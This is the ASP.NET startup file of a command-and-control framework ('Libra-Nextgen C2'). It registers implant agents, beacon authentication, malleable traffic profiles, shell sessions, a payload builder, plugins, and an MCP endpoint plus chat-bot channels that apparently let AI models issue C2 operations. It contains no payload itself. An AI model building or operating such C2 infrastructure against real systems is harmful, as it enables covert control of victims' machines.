using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.RateLimiting;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.IdentityModel.Tokens;
using Scalar.AspNetCore;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Hubs;
using LibraNextgen.Service.Middleware;
using LibraNextgen.Service.Models;
using LibraNextgen.Service.Services;
using LibraNextgen.Service.Controllers;

var builder = WebApplication.CreateBuilder(args);

// Drop the Windows EventLog provider: it is disposed during host shutdown, and a
// background task (Telegram/IM receiver) logging at that moment crashes the whole
// process via Logger.ThrowLoggingError. Console output is all the server needs.
builder.Logging.ClearProviders();
builder.Logging.AddConsole();
builder.Logging.AddDebug();

// MongoDB
builder.Services.Configure<MongoSettings>(builder.Configuration.GetSection(MongoSettings.SectionName));
builder.Services.AddSingleton<MongoDbContext>();
builder.Services.AddSingleton<ServerKeyService>();
builder.Services.AddSingleton<MongoIndexBuilder>();

// Beacon authentication (shared secret injected at build time)
builder.Services.Configure<BeaconSettings>(builder.Configuration.GetSection(BeaconSettings.SectionName));

builder.Services.Configure<AiSettings>(builder.Configuration.GetSection(AiSettings.SectionName));
builder.Services.AddSingleton<AiPromptFileLoader>();

var listenerSettings = ListenerSettingsLoader.Load();
builder.WebHost.ConfigureKestrel(options =>
{
    if (listenerSettings.BindLoopbackOnly)
        options.ListenLocalhost(listenerSettings.Port);
    else
        options.ListenAnyIP(listenerSettings.Port);

    options.Limits.RequestHeadersTimeout = TimeSpan.FromMinutes(5);
    options.Limits.KeepAliveTimeout = TimeSpan.FromMinutes(10);
});

builder.Services.AddHttpClient();

builder.Services.AddSingleton<Repository<Agent>>(sp =>
    new Repository<Agent>(sp.GetRequiredService<MongoDbContext>(), "agents"));
builder.Services.AddSingleton<Repository<AgentTask>>(sp =>
    new Repository<AgentTask>(sp.GetRequiredService<MongoDbContext>(), "tasks"));
builder.Services.AddSingleton<Repository<User>>(sp =>
    new Repository<User>(sp.GetRequiredService<MongoDbContext>(), "users"));
builder.Services.AddSingleton<Repository<AuditLog>>(sp =>
    new Repository<AuditLog>(sp.GetRequiredService<MongoDbContext>(), "audit_logs"));
builder.Services.AddSingleton<Repository<MalleableProfileConfig>>(sp =>
    new Repository<MalleableProfileConfig>(sp.GetRequiredService<MongoDbContext>(), "profiles"));
builder.Services.AddSingleton<Repository<TrafficRecord>>(sp =>
    new Repository<TrafficRecord>(sp.GetRequiredService<MongoDbContext>(), "traffic"));
builder.Services.AddSingleton<Repository<AccessKey>>(sp =>
    new Repository<AccessKey>(sp.GetRequiredService<MongoDbContext>(), "access_keys"));
builder.Services.AddSingleton<Repository<PluginRecord>>(sp =>
    new Repository<PluginRecord>(sp.GetRequiredService<MongoDbContext>(), "plugins"));
builder.Services.AddSingleton<Repository<BuildTrafficLists>>(sp =>
    new Repository<BuildTrafficLists>(sp.GetRequiredService<MongoDbContext>(), "build_lists"));
builder.Services.AddScoped<BuildListService>();
builder.Services.AddSingleton<AiService>();

builder.Services.AddSingleton<TelegramChannelAdapter>();
builder.Services.AddSingleton<LarkChannelAdapter>();
builder.Services.AddSingleton<WeChatClawAdapter>();
builder.Services.AddSingleton<AiChannelService>();
builder.Services.AddSingleton<AiEventNotifier>();
builder.Services.AddHostedService<TelegramBotHostedService>();
builder.Services.AddHostedService<ChannelPollingHostedService>();
builder.Services.AddHostedService<LarkWsChannelService>();

// JWT Settings (singleton, holds RSA key pair)
var jwtSettings = new JwtSettings();
builder.Services.AddSingleton(jwtSettings);
builder.Services.AddScoped<AuthService>();
builder.Services.AddScoped<AccountService>();
builder.Services.AddScoped<ProfileService>();
builder.Services.AddScoped<AgentService>();
builder.Services.AddScoped<TaskService>();
builder.Services.AddScoped<AgentCommsService>();
builder.Services.AddScoped<RelayService>();
builder.Services.AddSingleton<ServerScriptService>();

// WebSocket
builder.Services.AddSingleton<ISessionLock, ShellSessionLock>();
builder.Services.AddSingleton<AgentTrafficService>();
builder.Services.AddSingleton<ConnectionManager>();
builder.Services.AddSingleton<SessionKeyStore>();
builder.Services.AddSingleton<AgentEventHub>();
builder.Services.AddSingleton<DownloadTicketStore>();
builder.Services.AddSingleton<RiskPolicyService>();
builder.Services.AddSingleton<PermissionService>();
builder.Services.AddSingleton<McpService>();
builder.Services.AddSingleton<AuditService>();
builder.Services.AddScoped<AccessKeyService>();
builder.Services.AddSingleton<TemplateManagerService>();
builder.Services.AddSingleton<BuilderBuildService>();
builder.Services.AddScoped<PluginService>();
builder.Services.AddHostedService<HeartbeatMonitor>();

builder.Services.AddHttpContextAccessor();
builder.Services.AddMcpServer()
    .WithHttpTransport(options => options.Stateless = true)
    .WithToolsFromAssembly();

// Auth
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings.Issuer,
            ValidAudience = jwtSettings.Audience,
            IssuerSigningKey = new RsaSecurityKey(jwtSettings.Rsa),
            ClockSkew = TimeSpan.Zero
        };
        options.Events = new JwtBearerEvents
        {
            OnMessageReceived = context =>
            {
                var token = context.Request.Query["token"].FirstOrDefault();
                if (string.IsNullOrEmpty(token) &&
                    context.HttpContext.Request.RouteValues.TryGetValue("token", out var routeToken))
                {
                    token = routeToken?.ToString();
                }
                if (!string.IsNullOrEmpty(token))
                {
                    context.Token = token;
                }
                return Task.CompletedTask;
            }
        };
    });
builder.Services.AddAuthentication()
    .AddScheme<AuthenticationSchemeOptions, AccessKeyAuthHandler>("AccessKey", null);
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("McpPolicy", policy =>
        policy.AddAuthenticationSchemes("AccessKey").RequireAuthenticatedUser());
});

// Controllers + OpenAPI with Scalar UI
builder.Services.AddControllers().AddJsonOptions(options =>
{
    options.JsonSerializerOptions.Converters.Add(new JsonStringEnumConverter());
    // Match camelCase JSON (e.g. plugin meta.json "argsSchema") against
    // PascalCase C# models, case-insensitively. The plugin meta uses
    // camelCase keys; without this the nested classes deserialize empty.
    options.JsonSerializerOptions.PropertyNamingPolicy = JsonNamingPolicy.CamelCase;
    options.JsonSerializerOptions.PropertyNameCaseInsensitive = true;
});
builder.Services.AddOpenApi("v1", options =>
{
    options.AddDocumentTransformer((document, _, _) =>
    {
        document.Info.Title = "Libra-Nextgen API";
        document.Info.Version = "v1";
        document.Info.Description = "Libra-Nextgen C2 Framework REST API";
        return Task.CompletedTask;
    });
});

// WebSocket middleware is enabled via app.UseWebSockets()

var listenerSettings2 = ListenerSettingsLoader.Load();
var securitySettings = SecuritySettingsLoader.Load();
var allowedOrigins = builder.Configuration.GetSection("Cors:AllowedOrigins").Get<string[]>() ?? [];
builder.Services.AddCors(options =>
{
    options.AddPolicy("CorsSignalR", policy =>
    {
        if (listenerSettings2.BindLoopbackOnly)
        {
            if (allowedOrigins.Length > 0)
                policy.WithOrigins(allowedOrigins).AllowAnyHeader().AllowAnyMethod();
            else
                policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
        else if (securitySettings.OpenLan)
        {
            policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
        else
        {
            if (allowedOrigins.Length > 0)
                policy.WithOrigins(allowedOrigins).AllowAnyHeader().AllowAnyMethod();
            else
                policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
    });
});

// Rate Limiting
builder.Services.AddRateLimiter(options =>
{
    options.AddPolicy("auth", context =>
    {
        var ip = context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        return RateLimitPartition.GetFixedWindowLimiter(ip, _ => new FixedWindowRateLimiterOptions
        {
            PermitLimit = 5,
            Window = TimeSpan.FromMinutes(1),
            QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
            QueueLimit = 0,
        });
    });
    options.AddPolicy("mcp", context =>
    {
        var key = context.User.FindFirst(System.Security.Claims.ClaimTypes.NameIdentifier)?.Value
                  ?? context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        return RateLimitPartition.GetFixedWindowLimiter(key, _ => new FixedWindowRateLimiterOptions
        {
            PermitLimit = 120,
            Window = TimeSpan.FromMinutes(1),
            QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
            QueueLimit = 0,
        });
    });
    options.RejectionStatusCode = 429;
});

var app = builder.Build();

SettingsController.RebindListeners = (listenUrl, ct) =>
{
    _ = Task.Run(async () =>
    {
        await Task.Delay(1500, ct);
        var logger = app.Services.GetRequiredService<ILoggerFactory>()
            .CreateLogger("ListenerRebind");
        logger.LogInformation("Listener changed to {Url} — restarting service", listenUrl);
        try
        {
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            logger.LogError(ex, "Failed to trigger graceful shutdown");
        }
    }, ct);
    return Task.CompletedTask;
};

if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
app.UseExceptionHandler(errorApp =>
{
    errorApp.Run(async context =>
    {
        var exception = context.Features.Get<Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>()?.Error;
        var logger = context.RequestServices.GetRequiredService<ILoggerFactory>()
            .CreateLogger("GlobalExceptionHandler");
        if (exception != null)
            logger.LogError(exception, "Unhandled exception: {Path} {Method}",
                context.Request.Path, context.Request.Method);

        context.Response.StatusCode = StatusCodes.Status500InternalServerError;
        context.Response.ContentType = "application/json; charset=utf-8";
        await context.Response.WriteAsJsonAsync(new { error = "Internal server error" });
    });
});

app.MapOpenApi();
if (app.Environment.IsDevelopment())
{
    app.MapScalarApiReference(options =>
    {
        options.Title = "Libra-Nextgen API";
        options.Theme = Scalar.AspNetCore.ScalarTheme.DeepSpace;
    });
}

app.UseWebSockets(new WebSocketOptions { KeepAliveInterval = TimeSpan.FromSeconds(30) });
app.UseMiddleware<BeaconEntryMiddleware>();
app.UseMiddleware<ProfileFingerprintMiddleware>();
app.UseRouting();
app.UseCors("CorsSignalR");
app.UseAuthentication();
app.UseAuthorization();
app.UseRateLimiter();
app.UseMiddleware<PermissionMiddleware>();
app.UseMiddleware<AuditMiddleware>();
app.MapControllers();
app.UseMiddleware<McpToggleMiddleware>();
app.MapMcp("/mcp").RequireAuthorization("McpPolicy").RequireRateLimiting("mcp");
WebSocketHandler.Map(app);

// Ensure MongoDB indexes exist before serving traffic (best-effort).
try
{
    using (var scope = app.Services.CreateScope())
    {
        var indexBuilder = scope.ServiceProvider.GetRequiredService<MongoIndexBuilder>();
        indexBuilder.EnsureIndexesAsync().GetAwaiter().GetResult();
        var riskPolicy = scope.ServiceProvider.GetRequiredService<RiskPolicyService>();
        riskPolicy.LoadAsync().GetAwaiter().GetResult();
        var mcp = scope.ServiceProvider.GetRequiredService<McpService>();
        mcp.LoadAsync().GetAwaiter().GetResult();
        var plugins = scope.ServiceProvider.GetRequiredService<PluginService>();
        plugins.PreloadScriptsAsync().GetAwaiter().GetResult();
        var sessionKeys = scope.ServiceProvider.GetRequiredService<SessionKeyStore>();
        sessionKeys.LoadAsync().GetAwaiter().GetResult();
    }
}
catch (Exception ex)
{
    var logger = app.Services.GetRequiredService<ILoggerFactory>().CreateLogger("Startup");
    logger.LogWarning(ex, "MongoDB index initialization failed — continuing without indexes.");
}

app.Run();

/// <summary>Exposed for WebApplicationFactory-based integration tests.</summary>
public partial class Program { }
